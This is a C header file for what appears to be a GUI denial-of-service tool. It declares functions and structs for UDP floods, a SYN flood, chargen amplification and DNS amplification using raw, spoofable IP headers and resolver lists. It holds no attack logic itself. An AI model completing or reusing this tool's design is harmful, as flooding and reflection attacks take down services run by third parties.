#ifndef CALLBACKS_DDOS_H_INCLUDED
#define CALLBACKS_DDOS_H_INCLUDED

/** udp ddos **/
void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data);
void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data);

/** udp power **/

struct thread_data_power
{
    int pks;
    int throttle;
    int thread_id;
    unsigned int floodport;
    struct sockaddr_in sin;
};

void cb_udp_power_ddos(void);
uint32_t rand_cmwc_power(void);
char *myStrCat(char *s, char *a);
char *replStr(char *str, size_t count);
unsigned short csum_power(unsigned short *buf, int nwords);
void setup_ip_header_power(struct iphdr *iph);
void setup_udp_header_power(struct udphdr *udph);
void *flood_power(void *par1);


/** essyn flood **/
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

//static uint32_t Q[4096], c = 362436;

void init_rand(unsigned long int x);
unsigned long int rand_cmwc(void);
unsigned short csum (unsigned short *buf, int count);
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph);
void setup_ip_header(struct iphdr *iph);
void setup_tcp_header(struct tcphdr *tcph);
void *flood(void *par1)__attribute__((noreturn));
void cb_essyn_attack(void);

/** chargen ddos **/
#define MAX_PACKET_SIZE_CHARGEN 8192

unsigned short csum_chargen(unsigned short *buf, int nwords);
void setup_ip_header_chargen(struct iphdr *iph);
void setup_udp_header_chargen(struct udphdr *udph);
void *flood_chargen(void *par1)__attribute__((noreturn));
void cb_chargen_ddos(void);

/** dns amped **/

#define MAX_PACKET_SIZE_DNS 8192
#define PACKETS_PER_RESOLVER 5

//static uint32_t Q[4096], c = 362436;

struct list
{
    struct sockaddr_in data;
    char domain[256];
    int line;
    struct list *next;
    struct list *prev;
};

struct list *head;

struct thread_data
{
    int thread_id;
    struct list *list_node;
    struct sockaddr_in sin;
    int port;
};


struct DNS_HEADER
{
    unsigned short id; // identification number

    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag

    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available

    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

//Constant sized fields of query structure
struct QUESTION
{
    unsigned short qtype;
    unsigned short qclass;
};

//Constant sized fields of the resource record structure
struct QUERY
{
    unsigned char *name;
    struct QUESTION *ques;
};


void cb_dns_amped_ddos(void);
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host);
void init_rand_dns(uint32_t x);
uint32_t rand_cmwc_dns(void);
unsigned short csum_dns(unsigned short *buf, int nwords);
void *flood_dns(void *par1);
void ParseResolverLine(char *strLine, int iLine);

void run_script(void);


#endif

